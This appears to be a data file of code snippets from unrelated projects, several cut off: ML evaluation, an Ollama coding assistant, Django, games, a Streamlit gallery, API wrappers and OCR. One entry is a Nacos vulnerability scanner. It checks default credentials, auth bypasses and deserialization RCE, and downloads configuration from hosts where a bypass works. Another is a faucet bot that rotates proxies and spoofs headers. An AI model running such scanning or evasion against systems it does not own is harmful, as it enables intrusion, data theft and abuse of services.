DataLoader(dataset, batch_size=spec['batch_size'],\n        num_workers=8, pin_memory=True)\n\n    if args.model_path == 'none':\n        model_spec = torch.load(args.model)['model']\n        model = models.make(model_spec, load_sd=True).cuda()\n\n        eval_scale_list = config.get('eval_scale')\n        for eval_scale in eval_scale_list:\n            res = eval_psnr(loader, model,\n                data_norm=config.get('data_norm'),\n                eval_type=config.get('eval_type'),\n                eval_bsize=config.get('eval_bsize'),\n                eval_scale=eval_scale,\n                verbose=True)\n            print('result: {:.4f}'.format(res))\n    else:\n        ckpt_list = [ckpt_name for ckpt_name in os.listdir(args.model_path) if ckpt_name.endswith('.pth')]\n        \n            \n        for ckpt in ckpt_list:\n            print(f\"----- ckpt:{ckpt}\")\n            model_spec = torch.load(os.path.join(args.model_path, ckpt))['model']\n            model = models.make",
    "import vul_manager as vulmanager\nimport out_toMd \nimport os\n\n# \u9996\u5148\u63a2\u6d4b\u662f\u5426\u5b58\u5728\u6240\u6709\u6f0f\u6d1e\ndef vul_scan(host, down, proxy):\n    vul_manager = vulmanager.VulManager(host, down, proxy)\n    # \u83b7\u53d6\u7248\u672c\u53f7\n    vul_list = []\n    version = vul_manager.get_version()\n    vul_list.append(f\"[+] {host} Nacos\u7248\u672c\u53f7\uff1a{version}\")\n    is_bypass_vul = False\n    # \u9ed8\u8ba4\u7528\u6237\u6f0f\u6d1e\n    if vul_manager.default_nacos():\n        vul_list.append(f\"[!] {host} \u5b58\u5728 Nacos \u9ed8\u8ba4 username and password \u6f0f\u6d1e!\")\n        is_bypass_vul = True\n    # \u9ed8\u8ba4\u5bc6\u94a5\n    if vul_manager.get_accesstoken():\n        vul_list.append(f\"[!] {host} \u5b58\u5728 Nacos \u9ed8\u8ba4 jwtToken \u6f0f\u6d1e!\")\n        is_bypass_vul = True\n    # V1\u7684\u7ed5\u8fc7\n    if vul_manager.cross_check():\n        vul_list.append(f\"[!] {host} \u5b58\u5728 Nacos V1 authbypass \u6f0f\u6d1e!\")\n        is_bypass_vul = True\n    # UA:Nacos-Server\u7684\u7ed5\u8fc7\n    if vul_manager.cross_ua_check():\n        vul_list.append(f\"[!] {host} \u5b58\u5728 Nacos UA:Nacos-Server \u6f0f\u6d1e!\")\n        is_bypass_vul = True\n    # serverIdentity \u9274\u6743\u7ed5\u8fc7\n    if vul_manager.serveridentity_check():\n        vul_list.append(f\"[!] {host} \u5b58\u5728 Nacos serverIdentity \u9274\u6743\u7ed5\u8fc7 \u6f0f\u6d1e!\")\n        is_bypass_vul = True\n    # 7848 rce\n    if vul_manager.jraft_rce():\n        vul_list.append(f\"[!] {host} \u5b58\u5728Nacos Jraft \u53cd\u5e8f\u5217\u5316RCE \u6f0f\u6d1e!\u5982\u5f00\u542f7848\uff0c\u8bf7\u68c0\u67e5\")\n    # jraft\u6587\u4ef6\u8bfb\u53d6\n    if vul_manager.jraft_file_rw():\n        vul_list.append(f\"[!] {host} \u5b58\u5728Nacos Jraft \u6587\u4ef6\u8bfb\u53d6\u6f0f\u6d1e!\u5982\u5f00\u542f7848\uff0c\u8bf7\u68c0\u67e5\")\n    # \u672a\u6388\u6743sql\u547d\u4ee4\u6267\u884c\n    if vul_manager.authpass_sqlexe():\n        vul_list.append(f\"[!] {host} \u5b58\u5728Nacos \u672a\u6388\u6743sql\u6267\u884c\u6f0f\u6d1e!\u53ef\u53c2\u8003vulhub\u8fdb\u884cRCE\")\n    if down:\n        if is_bypass_vul:\n            filename = str(host).replace('.', '_').replace('http://', '').replace(':', '_') + '.zip'\n            out_toMd.OutToMd('./config_zip/' + filename).write_file_content()\n            output_md = './file_list_md/' + filename.replace('zip', 'md')\n            if os.path.exists(output_md):\n                vul_list.append(f\"[+] \u6587\u4ef6\u6e05\u5355\u5df2\u751f\u6210 {output_md}\")\n            else:\n                vul_list.append(\"[+] \u914d\u7f6e\u6587\u4ef6\u4e3a\u7a7a\uff0c\u6ca1\u6709\u751f\u6210\u6e05\u5355\")\n    return vul_list\n    ",
    "#!/usr/bin/env python3\n\nimport os\nimport sys\nimport json\nfrom pathlib import Path\nfrom textwrap import dedent\nfrom typing import List, Dict, Any, Optional\nimport requests\nfrom pydantic import BaseModel\nimport random\n\n# --------------------------------------------------------------------------------\n# 1. Configure Ollama client settings\n# --------------------------------------------------------------------------------\nOLLAMA_BASE_URL = \"http://localhost:11434\"\nMODEL_NAME = \"qwen2.5-coder:14b\"\n\n# Word lists for random folder names\nADJECTIVES = ['swift', 'bright', 'calm', 'wise', 'bold', 'kind', 'pure', 'warm', 'cool', 'soft']\nNOUNS = ['river', 'mountain', 'forest', 'cloud', 'star', 'ocean', 'valley', 'meadow', 'wind', 'sun']\nCOLORS = ['azure', 'coral', 'jade', 'amber', 'ruby', 'pearl', 'gold', 'silver', 'bronze', 'crystal']\n\ndef generate_random_folder_name() -> str:\n    \"\"\"Generate a random 3-word folder name\"\"\"\n    return f\"{random.choice(ADJECTIVES)}_{random.choice(COLORS)}_{random.choice(NOUNS)}\"\n\n# Color codes for terminal output\nclass Colors:\n    BLUE = '\\033[94m'\n    GREEN = '\\033[92m'\n    YELLOW = '\\033[93m'\n    RED = '\\033[91m'\n    CYAN = '\\033[96m'\n    BOLD = '\\033[1m'\n    END = '\\033[0m'\n\ndef print_color(text: str, color: str = '', end='\\n'):\n    \"\"\"Print colored text to terminal\"\"\"\n    print(f\"{color}{text}{Colors.END}\", end=end)\n\n# --------------------------------------------------------------------------------\n# 2. Define our schema using Pydantic for type safety\n# --------------------------------------------------------------------------------\nclass FileToCreate(BaseModel):\n    path: str\n    content: str\n\n# NEW: Diff editing structure\nclass FileToEdit(BaseModel):\n    path: str\n    original_snippet: str\n    new_snippet: str\n\nclass AssistantResponse(BaseModel):\n    assistant_reply: str\n    files_to_create: Optional[List[FileToCreate]] = None\n    # NEW: optionally hold diff edits\n    files_to_edit: Optional[List[FileToEdit]] = None\n\n# --------------------------------------------------------------------------------\n# 3. system prompt\n# --------------------------------------------------------------------------------\nsystem_PROMPT = dedent(\"\"\"\\\n    You are an elite software engineer called Ollama Engineer with decades of experience across all programming domains.\n    Your expertise spans system design, algorithms, testing, and best practices.\n    You provide thoughtful, well-structured solutions while explaining your reasoning.\n\n    Core capabilities:\n    1. Code Analysis & Discussion\n       - Analyze code with expert-level insight\n       - Explain complex concepts clearly\n       - Suggest optimizations and best practices\n       - Debug issues with precision\n\n    2. File Operations:\n       a) Read existing files\n          - Access user-provided file contents for context\n          - Analyze multiple files to understand project structure\n       \n       b) Create new files\n          - Generate complete new files with proper structure\n          - Create complementary files (tests, configs, etc.)\n       \n       c) Edit existing files\n          - Make precise changes using diff-based editing\n          - Modify specific sections while preserving context\n          - Suggest refactoring improvements\n\n    Output Format:\n    You must provide responses in this JSON structure:\n    {\n      \"assistant_reply\": \"Your main explanation or response\",\n      \"files_to_create\": [\n        {\n          \"path\": \"path/to/new/file\",\n          \"content\": \"complete file content\"\n        }\n      ],\n      \"files_to_edit\": [\n        {\n          \"path\": \"path/to/existing/file\",\n          \"original_snippet\": \"exact code to be replaced\",\n          \"new_snippet\": \"new code to insert\"\n        }\n      ]\n    }\n\n    Guidelines:\n    1. For normal responses, use 'assistant_reply'\n    2. When creating files, include full content in 'files_to_create'\n    3. For editing files:\n       - Use 'files_to_edit' for precise changes\n       - Include enough context in original_snippet to locate the change\n       - Ensure new_snippet maintains proper indentation\n       - Prefer targeted edits over full file replacements\n    4. Always explain your changes and reasoning\n    5. Consider edge cases and potential impacts\n    6. Follow language-specific best practices\n    7. Suggest tests or validation steps when appropriate\n\n    Remember: You're a senior engineer - be thorough, precise, and thoughtful in your solutions.\n\"\"\")\n\n# --------------------------------------------------------------------------------\n# 4. Helper functions \n# --------------------------------------------------------------------------------\n\ndef read_local_file(file_path: str) -> str:\n    \"\"\"Return the text content of a local file.\"\"\"\n    with open(file_path, \"r\", encoding=\"utf-8\") as f:\n        return f.read()\n\ndef create_file(path: str, content: str):\n    \"\"\"Create (or overwrite) a file at 'path' with the given 'content'.\"\"\"\n    file_path = Path(path)\n    \n    # If this is a new file (not ",
    "# Generated by Django 5.1.4 on 2025-01-02 11:17\n\nimport django.contrib.auth.models\nimport django.contrib.auth.validators\nimport django.utils.timezone\nfrom django.db import migrations, models\n\n\nclass Migration(migrations.Migration):\n\n    initial = True\n\n    dependencies = [\n        ('auth', '0012_alter_user_first_name_max_length'),\n    ]\n\n    operations = [\n        migrations.CreateModel(\n            name='CustomUser',\n            fields=[\n                ('id', models.BigAutoField(auto_created=True, primary_key=True, serialize=False, verbose_name='ID')),\n                ('password', models.CharField(max_length=128, verbose_name='password')),\n                ('last_login', models.DateTimeField(blank=True, null=True, verbose_name='last login')),\n                ('is_superuser', models.BooleanField(default=False, help_text='Designates that this user has all permissions without explicitly assigning them.', verbose_name='superuser status')),\n                ('username', models.CharField(error_messages={'unique': 'A user with that username already exists.'}, help_text='Required. 150 characters or fewer. Letters, digits and @/./+/-/_ only.', max_length=150, unique=True, validators=[django.contrib.auth.validators.UnicodeUsernameValidator()], verbose_name='username')),\n                ('first_name', models.CharField(blank=True, max_length=150, verbose_name='first name')),\n                ('last_name', models.CharField(blank=True, max_length=150, verbose_name='last name')),\n                ('is_staff', models.BooleanField(default=False, help_text='Designates whether the user can log into this admin site.', verbose_name='staff status')),\n                ('is_active', models.BooleanField(default=True, help_text='Designates whether this user should be treated as active. Unselect this instead of deleting accounts.', verbose_name='active')),\n                ('date_joined', models.DateTimeField(default=django.utils.timezone.now, verbose_name='date joined')),\n                ('email', models.EmailField(max_length=254, unique=True)),\n                ('groups', models.ManyToManyField(blank=True, help_text='The groups this user belongs to. A user will get all permissions granted to each of their groups.', related_name='user_set', related_query_name='user', to='auth.group', verbose_name='groups')),\n                ('user_permissions', models.ManyToManyField(blank=True, help_text='Specific permissions for this user.', related_name='user_set', related_query_name='user', to='auth.permission', verbose_name='user permissions')),\n            ],\n            options={\n                'verbose_name': 'user',\n                'verbose_name_plural': 'users',\n                'abstract': False,\n            },\n            managers=[\n                ('objects', django.contrib.auth.models.UserManager()),\n            ],\n        ),\n    ]\n",
    "# ***************************************************************************\r\n# *                                                                         *\r\n# *   Copyright (c) 2025 Hakan Seven <hakanseven12@gmail.com>               *\r\n# *                                                                         *\r\n# *   This program is free software; you can redistribute it and/or modify  *\r\n# *   it under the terms of the GNU Lesser General Public License (LGPL)    *\r\n# *   as published by the Free Software Foundation; either version 2 of     *\r\n# *   the License, or (at your option) any later version.                   *\r\n# *   for detail see the LICENCE text file.                                 *\r\n# *                                                                         *\r\n# *   This program is distributed in the hope that it will be useful,       *\r\n# *   but WITHOUT ANY WARRANTY; without even the implied warranty of        *\r\n# *   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the         *\r\n# *   GNU Library General Public License for more details.                  *\r\n# *                                                                         *\r\n# *   You should have received a copy of the GNU Library General Public     *\r\n# *   License along with this program; if not, write to the Free Software   *\r\n# *   Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA  02111-1307  *\r\n# *   USA                                                                   *\r\n# *                                                                         *\r\n# ***************************************************************************\r\n\r\n\"\"\"Provides the task panel code for Task Panels.\"\"\"\r\n\r\nclass TaskPanel:\r\n    def __init__(self,widget=None):\r\n        self.form = widget\r\n\r\n    def accept(self):\r\n        return True\r\n\r\n    def reject(self):\r\n        return True\r\n\r\n    def clicked(self, index):\r\n        pass\r\n\r\n    def open(self):\r\n        pass\r\n\r\n    def needsFullSpace(self):\r\n        return True\r\n\r\n    def isAllowedAlterSelection(self):\r\n        return True\r\n\r\n    def isAllowedAlterView(self):\r\n        return True\r\n\r\n    def isAllowedAlterDocument(self):\r\n        return True\r\n\r\n    def helpRequested(self):\r\n        pass\r\n",
    "import random\nimport hangman_art\nimport word\n\nfrom os import system, name\n\n\ndef clear():\n    # for windows\n    if name == \"nt\":\n        _ = system(\"cls\")\n    # for mac and linux(here, os.name is \"posix\")\n    else:\n        _ = system(\"clear\")\n\n\nchosen_word = random.choice(word.word_list)\n\nlives = 7\nprint(hangman_art.logo)\n\n# Testing code\nprint(f\"sssst, the solution is {chosen_word}\")\n\ndisplay = []\nfor _ in chosen_word:\n    display.append(\"_\")\n\nend_of_game = False\n\nwhile not end_of_game:\n    guess = input(\"Guess a letter: \").lower()\n\n    clear()\n\n    if guess in display:\n        print(f\"You've already guessed {guess}\")\n\n    for position in range(len(chosen_word)):\n        if chosen_word[position] == guess:\n            display[position] = guess\n\n    if guess not in chosen_word:\n        print(f\"You guessed {guess}, that's not in the word. You lose a life.\")\n        lives -= 1\n\n    # Join all the elements in the list and turn it into a string.\n    print(\" \".join(display))\n\n    if lives == 0:\n        print(\"You lose!\")\n        end_of_game = True\n    elif \"_\" not in display:\n        print(\"You win!\")\n        end_of_game = True\n\n    print(hangman_art.stages[lives])\n",
    "import streamlit as st\nimport sqlite3\nfrom PIL import Image, UnidentifiedImageError\nimport io\n\n# Page Configuration\nst.set_page_config(page_title=\"Art and Video Gallery\", layout=\"wide\")\n\n# Database Setup\nDATABASE = \"art_gallery.db\"\nADMIN_PASSWORD = \"___your_password___\"  # Replace with a secure password\n\ndef init_db():\n    \"\"\"Initialize the database with the necessary tables and columns.\"\"\"\n    conn = sqlite3.connect(DATABASE)\n    c = conn.cursor()\n\n    # Create gallery table if not exists\n    c.execute('''\n    CREATE TABLE IF NOT EXISTS gallery (\n        id INTEGER PRIMARY KEY AUTOINCREMENT,\n        title TEXT,\n        description TEXT,\n        media BLOB,\n        media_type TEXT\n    )\n    ''')\n\n    # Create counter table if not exists\n    c.execute('''\n    CREATE TABLE IF NOT EXISTS view_counter (\n        id INTEGER PRIMARY KEY AUTOINCREMENT,\n        count INTEGER\n    )\n    ''')\n\n    # Initialize counter if empty\n    c.execute(\"SELECT COUNT(*) FROM view_counter\")\n    if c.fetchone()[0] == 0:\n        c.execute(\"INSERT INTO view_counter (count) VALUES (0)\")\n    conn.commit()\n    conn.close()\n\ndef increment_counter():\n    \"\"\"Increment the web page view counter.\"\"\"\n    conn = sqlite3.connect(DATABASE)\n    c = conn.cursor()\n    c.execute(\"UPDATE view_counter SET count = count + 1 WHERE id = 1\")\n    conn.commit()\n    conn.close()\n\ndef get_page_views():\n    \"\"\"Get the current web page view count.\"\"\"\n    conn = sqlite3.connect(DATABASE)\n    c = conn.cursor()\n    c.execute(\"SELECT count FROM view_counter WHERE id = 1\")\n    views = c.fetchone()[0]\n    conn.close()\n    return views\n\ndef save_to_db(title, description, media, media_type):\n    \"\"\"Save an art piece or video to the database.\"\"\"\n    conn = sqlite3.connect(DATABASE)\n    c = conn.cursor()\n    c.execute('INSERT INTO gallery (title, description, media, media_type) VALUES (?, ?, ?, ?)', \n              (title, description, media, media_type))\n    conn.commit()\n    conn.close()\n\ndef fetch_gallery_items():\n    \"\"\"Fetch all gallery items (art pieces and videos) from the database.\"\"\"\n    conn = sqlite3.connect(DATABASE)\n    c = conn.cursor()\n    c.execute('SELECT id, title, description, media, media_type FROM gallery ORDER BY id DESC')\n    items = c.fetchall()\n    conn.close()\n    return items\n\ndef update_gallery_item(item_id, title, description, new_media=None, new_media_type=None):\n    \"\"\"Update the title, description, and optionally the media of a gallery item.\"\"\"\n    conn = sqlite3.connect(DATABASE)\n    c = conn.cursor()\n    \n    if new_media and new_media_type:\n        c.execute('UPDATE gallery SET title = ?, description = ?, media = ?, media_type = ? WHERE id = ?', \n                  (title, description, new_media, new_media_type, item_id))\n    else:\n        c.execute('UPDATE gallery SET title = ?, description = ? WHERE id = ?', \n                  (title, description, item_id))\n    \n    conn.commit()\n    conn.close()\n\ndef delete_gallery_item(item_id):\n    \"\"\"Delete a gallery item from the database.\"\"\"\n    conn = sqlite3.connect(DATABASE)\n    c = conn.cursor()\n    c.execute('DELETE FROM gallery WHERE id = ?', (item_id,))\n    conn.commit()\n    conn.close()\n\n# Initialize Database and Increment Counter\ninit_db()\nincrement_counter()\n\n# Add custom CSS for styling\nst.markdown(\"\"\"\n<style>\n    .card {\n        padding: 5px;\n        margin: 5px;\n        background-color: #ffffff;\n        border-radius: 10px;\n        box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);\n        text-align: center;\n    }\n    .card img, .card video {\n        border-radius: 10px;\n        margin: 0;\n        display: block;\n        width: 100%;\n    }\n    .card-title {\n        font-size: 16px;\n        font-weight: bold;\n        margin-top: 5px;\n    }\n    .card-description {\n        font-size: 12px;\n        color: gray;\n        margin: 2px 0;\n    }\n    .github-link {\n        font-size: 10px;  /* Smaller font for GitHub link */\n        text-align: left;\n        margin-top: 10px;\n        color: #666;  /* Gray color */\n    }\n    .footer {\n        text-align: center;\n        margin-top: 20px;\n        font-size: 12px;\n        color: #888;\n    }\n</style>\n\"\"\", unsafe_allow_html=True)\n\n# Streamlit App Setup\nst.title(\"\u2764\ufe0f Art and Video Gallery\")\nst.write(\"Millie Bay @ British School in Tokyo\")\nst.markdown(\n    '<div class=\"github-link\">'\n    'Source code for this blog: <a href=\"https://github.com/25mb-git/art-gallery\" target=\"_blank\">visit my GitHub</a>'\n    '</div>',\n    unsafe_allow_html=True,\n)\n\n# Admin Authentication\nis_admin = False\nwith st.sidebar.expander(\"Admin Login\", expanded=False):\n    admin_password = st.text_input(\"Enter Admin Password\", type=\"password\")\n    if admin_password == ADMIN_PASSWORD:\n        st.success(\"Admin Access Granted\")\n        is_admin = True\n    elif admin_password:\n        st.error(\"Incorrect Password\")\n\n# Admin Panel\nif is_admin:\n    with st.sidebar.expander(\"Admin Panel\", expanded=False):\n        uploaded_file = st.file_uploader(\"Upload an image or video\", type=[\"png\", \"jpg\", \"jpe",
    "import json\nimport requests\nfrom deepseek.const import *\n\n\nclass DeepSeekAPI:\n    def __init__(self, api_key=DEEPSEEK_API_KEY):\n        if api_key is None:\n            raise ValueError(\"DEEPSEEK_API_KEY is missing\")\n        self.api_key = api_key\n        self.headers = {\n            'Content-Type': 'application/json',\n            'Accept': 'application/json',\n            'Authorization': f'Bearer {self.api_key}'\n        }\n\n\n    def user_balance(self):\n        response = requests.get(API_USER_BAL, headers=self.headers)\n        return response.json()\n\n    def _post_request(self, api_url, payload, stream):\n        response = requests.post(api_url, headers=self.headers, data=json.dumps(payload), stream=stream)\n        if response.status_code >= 300:\n            raise Exception(f\"HTTP Error {response.status_code}: {response.text}\")\n        return response\n\n    def completion_impl(self, response, type_='chat'):\n        for line in response.iter_lines():\n            if line:  # Process non-empty lines\n                # Remove 'data: ' prefix if present\n                line = line.decode('utf-8').strip()\n                if line.startswith('data: '):\n                    line = line[6:].strip()\n                # Skip empty or invalid lines\n                if not line or line == '[DONE]':\n                    break\n                # Parse valid JSON\n                decoded_line = json.loads(line)\n                if 'choices' in decoded_line:\n                    finish_reason = decoded_line['choices'][0].get('finish_reason', None)\n                    if type_ == 'chat':\n                        delta_content = decoded_line['choices'][0].get('delta', {}).get('content', '')\n                    elif type_ == 'fim':\n                        delta_content = decoded_line['choices'][0].get('text', '')\n                    if delta_content:\n                        yield delta_content\n                    if finish_reason == 'stop':\n                        break\n\n    def chat_completion(self, prompt=DEFAULT_USR_PROM, prompt_sys=DEFAULT_SYS_PROM, stream=False, model='deepseek-chat',\n                        **kwargs):\n        payload = {\"model\": model, \"frequency_penalty\": 0, \"max_tokens\": 2048, \"presence_penalty\": 0,\n                   \"response_format\": {\"type\": \"text\"}, \"stop\": None, \"stream\": stream, \"stream_options\": None,\n                   \"temperature\": 1, \"top_p\": 1, \"tools\": None, \"tool_choice\": \"none\", \"logprobs\": False,\n                   \"top_logprobs\": None, 'messages': [\n                {\"content\": prompt_sys, \"role\": \"system\"},\n                {\"content\": prompt, \"role\": \"user\"}\n            ] if isinstance(prompt, str) else prompt}\n        payload.update(kwargs)\n\n        response = self._post_request(API_CHAT_COM, payload, stream)\n        return self.completion_impl(response, 'chat') if stream else \\\n            response.json()['choices'][0].get('message', {}).get('content', '')\n\n    def fim_completion(self, prompt=DEFAULT_USR_PROM, stream=False, model='deepseek-chat', **kwargs):\n        payload = {\n            \"model\": model,\n            \"prompt\": prompt,\n            \"echo\": False,\n            \"frequency_penalty\": 0,\n            \"logprobs\": 0,\n            \"max_tokens\": 1024,\n            \"presence_penalty\": 0,\n            \"stop\": None,\n            \"stream\": stream,\n            \"stream_options\": None,\n            \"suffix\": None,\n            \"temperature\": 1,\n            \"top_p\": 1\n        }\n\n        payload.update(kwargs)\n        response = self._post_request(API_CHAT_FIM, payload, stream)\n        return self.completion_impl(response, 'fim') if stream else \\\n            response.json()['choices'][0].get('text', '')\n\n    def get_models(self):\n        response = requests.get(API_CHAT_MOD, headers=self.headers)\n        r = response.json()\n        models = []\n        for i in r['data']:\n            models.append(i['id'])\n        return models\n",
    "import random\nimport time\nimport customtkinter as ctk\n\ndef is_valid(board, row, col, num):\n    \"\"\"Check if placing a number in a cell is valid.\"\"\"\n    # Check row\n    if num in board[row]:\n        return False\n\n    # Check column\n    if num in [board[i][col] for i in range(9)]:\n        return False\n\n    # Check 3x3 grid\n    start_row, start_col = 3 * (row // 3), 3 * (col // 3)\n    for i in range(start_row, start_row + 3):\n        for j in range(start_col, start_col + 3):\n            if board[i][j] == num:\n                return False\n\n    return True\n\ndef find_empty_cell(board):\n    \"\"\"Find an empty cell in the board. Returns (row, col) or None.\"\"\"\n    for i in range(9):\n        for j in range(9):\n            if board[i][j] == 0:\n                return i, j\n    return None\n\ndef solve_sudoku_gui(board, grid_labels, app):\n    \"\"\"Solve the Sudoku board using backtracking and update GUI.\"\"\"\n    empty_cell = find_empty_cell(board)\n    if not empty_cell:\n        return True  # No empty cells, puzzle is solved\n\n    row, col = empty_cell\n\n    # Optimize number order based on possible placements\n    possible_numbers = list(range(1, 10))\n    random.shuffle(possible_numbers)\n\n    for num in possible_numbers:\n        if is_valid(board, row, col, num):\n            board[row][col] = num\n            update_grid(grid_labels, board)\n            app.update_idletasks()  # Update the GUI\n            time.sleep(0.01)  # Add a small delay for visualization\n\n            if solve_sudoku_gui(board, grid_labels, app):\n                return True\n\n            # Undo the move\n            board[row][col] = 0\n            update_grid(grid_labels, board)\n            app.update_idletasks()  # Update the GUI\n\n    return False\n\ndef update_grid(grid_labels, board):\n    \"\"\"Update the GUI grid with the current board state.\"\"\"\n    for i in range(9):\n        for j in range(9):\n            num = board[i][j]\n            if num == 0:\n                grid_labels[i][j].configure(text=\"\", text_color=\"gray\")\n            else:\n                grid_labels[i][j].configure(text=str(num), text_color=\"blue\")\n\ndef generate_random_sudoku():\n    \"\"\"Generate a random Sudoku puzzle.\"\"\"\n    board = [[0 for _ in range(9)] for _ in range(9)]\n    for _ in range(random.randint(12, 25)):  # Randomly fill between 12 to 25 cells\n        row, col = random.randint(0, 8), random.randint(0, 8)\n        num = random.randint(1, 9)\n        if board[row][col] == 0 and is_valid(board, row, col, num):\n            board[row][col] = num\n    return board\n\ndef main():\n    \"\"\"Main function to run the Sudoku solver with GUI.\"\"\"\n    sudoku_board = generate_random_sudoku()\n\n    app = ctk.CTk()\n    app.title(\"Sudoku Solver\")\n\n    frame = ctk.CTkFrame(app, width=500, height=500)\n    frame.pack(pady=10, padx=10)\n\n    grid_labels = []\n    for i in range(9):\n        row_labels = []\n        for j in range(9):\n            bg_color = \"gray75\" if (i // 3 + j // 3) % 2 == 0 else \"gray90\"\n            label = ctk.CTkLabel(frame, text=\"\", width=50, height=50, corner_radius=5, font=(\"Arial\", 18), fg_color=bg_color)\n            label.grid(row=i, column=j, padx=2, pady=2)\n            row_labels.append(label)\n        grid_labels.append(row_labels)\n\n    update_grid(grid_labels, sudoku_board)\n\n    def solve():\n        start_time = time.time()\n        if solve_sudoku_gui(sudoku_board, grid_labels, app):\n            end_time = time.time()\n            status_label.configure(text=f\"Sudoku Solved in {end_time - start_time:.2f} seconds!\", text_color=\"green\")\n        else:\n            status_label.configure(text=\"No Solution Exists.\", text_color=\"red\")\n\n    solve_button = ctk.CTkButton(app, text=\"Solve\", command=solve, font=(\"Arial\", 16))\n    solve_button.pack(pady=10)\n\n    status_label = ctk.CTkLabel(app, text=\"Click 'Solve' to start solving the Sudoku.\", font=(\"Arial\", 14))\n    status_label.pack()\n\n    app.mainloop()\n\nif __name__ == \"__main__\":\n    main()\n",
    "import easyocr\nimport cv2\nimport matplotlib.pyplot as plt\n\n# Initialize the EasyOCR reader\nreader = easyocr.Reader(['en'])  # Adjust languages as necessary\n\n# Load the image from your PC\nimage_path = r'c:\\Users\\siyam\\Pictures\\download (1).jpeg'\nimage = cv2.imread(image_path)\n\n# Convert to grayscale\ngray_image = cv2.cvtColor(image, cv2.COLOR_BGR2GRAY)\n\n# Apply Gaussian Blur\nblurred_image = cv2.GaussianBlur(gray_image, (5, 5), 0)\n\n# Apply adaptive thresholding\nthresh_image = cv2.adaptiveThreshold(blurred_image, 255, \n                                     cv2.ADAPTIVE_THRESH_GAUSSIAN_C, \n                                     cv2.THRESH_BINARY_INV, \n                                     11, 2)\n\n# Perform OCR on the preprocessed image\nresults = reader.readtext(thresh_image)\n\n# Print the results\nfor (bbox, text, prob) in results:\n    print(f'Detected text: {text} (Confidence: {prob:.2f})')\n\n# Optionally, display the image with detected text\nfor (bbox, text, prob) in results:\n    (top_left, top_right, bottom_right, bottom_left) = bbox\n    top_left = tuple(map(int, top_left))\n    bottom_right = tuple(map(int, bottom_right))\n    cv2.rectangle(image, top_left, bottom_right, (0, 255, 0), 2)\n    cv2.putText(image, text, (top_left[0], top_left[1] - 10), \n                cv2.FONT_HERSHEY_SIMPLEX, 0.5, (0, 255, 0), 2)\n\n# Show the image with detected text\nplt.imshow(cv2.cvtColor(image, cv2.COLOR_BGR2RGB))\nplt.axis('off')\nplt.show()",
    "import json\nimport random\nimport time\nimport sys\nfrom typing import List\nfrom pathlib import Path\nfrom web3 import Web3\nfrom colorama import init, Fore, Style\nimport requests\n\n# Initialize colorama\ninit(autoreset=True)\n\ndef log_info(message: str):\n    print(f\"{Fore.CYAN+Style.BRIGHT}{message}{Style.RESET_ALL}\")\n\ndef log_success(message: str):\n    print(f\"{Fore.GREEN+Style.BRIGHT}{message}{Style.RESET_ALL}\")\n\ndef log_error(message: str):\n    print(f\"{Fore.RED+Style.BRIGHT}{message}{Style.RESET_ALL}\")\n\ndef log_kuning(message: str):\n    print(f\"{Fore.YELLOW+Style.BRIGHT}{message}{Style.RESET_ALL}\")\n\ndef log_putih(message: str):\n    print(f\"{Fore.WHITE+Style.BRIGHT}{message}{Style.RESET_ALL}\")\n\ndef prompt_user(question: str) -> int:\n    while True:\n        try:\n            answer = input(f\"{Fore.CYAN}{question}{Style.RESET_ALL} \")\n            return int(answer)\n        except ValueError:\n            log_error(\"\u2757 Please enter a valid integer.\")\n\ndef delay(seconds: float):\n    time.sleep(seconds)\n\ndef load_private_keys(file_path: str = \"privatekeys.txt\") -> List[str]:\n    try:\n        keys = Path(file_path).read_text().strip().splitlines()\n        if not keys:\n            raise ValueError('\u2757 No private keys found in the file.')\n        return keys\n    except FileNotFoundError:\n        log_error(f\"\u2757 File {file_path} not found. Ensure the file exists and contains private keys.\")\n        sys.exit(1)\n    except Exception as e:\n        log_error(f\"\u2757 Error loading private keys: {e}\")\n        sys.exit(1)\n\ndef load_proxies(file_path: str = \"proxy.txt\") -> List[str]:\n    try:\n        proxies = Path(file_path).read_text().strip().splitlines()\n        if not proxies:\n            raise ValueError('\u2757 No proxies found in the file.')\n        return proxies\n    except FileNotFoundError:\n        log_error(f\"\u2757 File {file_path} not found. Ensure the file exists and contains proxies.\")\n        sys.exit(1)\n    except Exception as e:\n        log_error(f\"\u2757 Error loading proxies: {e}\")\n        sys.exit(1)\n\ndef load_addresses(file_path: str = \"address.txt\") -> List[str]:\n    try:\n        addresses = Path(file_path).read_text().strip().splitlines()\n        if not addresses:\n            raise ValueError('\u2757 No addresses found in the file.')\n        # Validate addresses\n        valid_addresses = []\n        for addr in addresses:\n            if Web3.is_address(addr):\n                valid_addresses.append(Web3.to_checksum_address(addr))\n            else:\n                log_error(f\"\u2757 Invalid address skipped: {addr}\")\n        if not valid_addresses:\n            raise ValueError('\u2757 No valid addresses found in the file.')\n        return valid_addresses\n    except FileNotFoundError:\n        log_error(f\"\u2757 File {file_path} not found. Ensure the file exists and contains addresses.\")\n        sys.exit(1)\n    except Exception as e:\n        log_error(f\"\u2757 Error loading addresses: {e}\")\n        sys.exit(1)\n\ndef get_random_proxy(proxies: List[str]) -> dict:\n    proxy = random.choice(proxies)\n    return {\n        \"http\": proxy,\n        \"https\": proxy\n    }\n\ndef claim_faucet(address: str, proxies: List[str]) -> bool:\n    url = \"https://faucet-test.haust.network/api/claim\"\n    \n    payload = json.dumps({\n      \"address\": address\n    })\n    \n    headers = {\n      'accept': '*/*',\n      'accept-language': 'en-US,en;q=0.9',\n      'cache-control': 'no-cache',\n      'content-type': 'application/json',\n      'origin': 'https://faucet-test.haust.network',\n      'pragma': 'no-cache',\n      'priority': 'u=1, i',\n      'referer': 'https://faucet-test.haust.network/',\n      'sec-ch-ua': '\"Google Chrome\";v=\"131\", \"Chromium\";v=\"131\", \"Not_A Brand\";v=\"24\"',\n      'sec-ch-ua-mobile': '?0',\n      'sec-ch-ua-platform': '\"Windows\"',\n      'sec-fetch-dest': 'empty',\n      'sec-fetch-mode': 'cors',\n      'sec-fetch-site': 'same-origin',\n      'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36'\n    }\n    \n    while True:\n        proxy_dict = get_random_proxy(proxies)\n        try:\n            response = requests.post(url, headers=headers, data=payload, proxies=proxy_dict, timeout=10)\n            result = response.json()\n            if \"msg\" in result and \"Txhash\" in result[\"msg\"]:\n                log_success(f\"    \u2705\ufe0f Successfully claimed faucet for 